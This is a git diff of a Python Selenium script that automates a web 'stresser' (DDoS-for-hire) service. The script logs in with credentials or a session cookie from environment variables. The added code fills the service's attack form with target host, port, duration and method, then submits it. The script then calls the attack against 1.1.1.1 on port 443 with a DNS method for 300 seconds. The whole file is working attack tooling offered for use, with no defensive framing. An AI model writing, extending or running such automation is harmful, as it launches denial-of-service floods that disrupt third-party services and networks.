@@ -3,6 +3,7 @@ from selenium.webdriver.common.keys import Keys
 from selenium.webdriver.common.by import By
 from selenium.webdriver.support.ui import WebDriverWait
 from selenium.webdriver.support import expected_conditions as EC
+from selenium.webdriver.support.ui import Select
 from selenium.webdriver.chrome.options import Options
 from selenium.webdriver import ChromeService, FirefoxService
 
@@ -16,12 +17,7 @@ username = os.getenv("username")
 password = os.getenv("password")
 
 
-# Poner cookies si quiere login por cookies
-cookies = [
-    {
-        "test": "test"
-    }
-]
+
 
 drivers = {
     "geckoDriver": "./drivers/geckodriver.exe",
@@ -36,12 +32,24 @@ logger.addHandler(handler)
 
 firefox_options = webdriver.FirefoxOptions()
 
+
 #firefox_options.add_argument("--headless")
 
 
 service = FirefoxService(executable_path=drivers["geckoDriver"], log_output="./debug.log")
 
+
+# Poner cookies si quiere login por cookies
+cookies = [
+    {
+        "name": "UID",
+        #"exp": os.getenv("coookie_exp"),
+        "value": os.getenv("cookie")
+    }
+]
+
 driver = webdriver.Firefox(service=service, options=firefox_options)
+#driver.add_cookie(cookie_dict=cookies[0])
 
 class Pages:
     def __init__(self) -> None:
@@ -81,10 +89,23 @@ class Main(Pages):
     def start_attack(self, ip: str, port: int, time: int, method: str):
         self.DDoS_page()
 
+        self.button_telegram = driver.find_element(By.CLASS_NAME, "close")
+        
         self.ip_form = driver.find_element(By.ID, "host")
         self.port_form = driver.find_element(By.ID, "port")
         self.time_form = driver.find_element(By.ID, "time")
-        self.method_form = driver.find_element(By.ID, "method")
+        self.method_form = Select(driver.find_element(By.ID, "method"))
+        self.button_form = driver.find_element(By.CLASS_NAME, "btn")
+
+
+        self.button_telegram.click()
+        self.DDoS_page()
+        self.ip_form.send_keys(ip)
+        self.port_form.send_keys(port)
+        self.time_form.send_keys(time)
+        self.method_form.select_by_value(method)
+        self.button_form.click()
+
 
     def driver_quit(self) -> any:
         driver.quit()
@@ -93,6 +114,6 @@ class Main(Pages):
 
 bot = Main(driver=driver)
 bot.login_form()
-WebDriverWait(driver, 10).until(EC.url_to_be("https://www.stressthem.se/home"))
+
 bot.start_attack("1.1.1.1", 443, 300, "DNS")
 
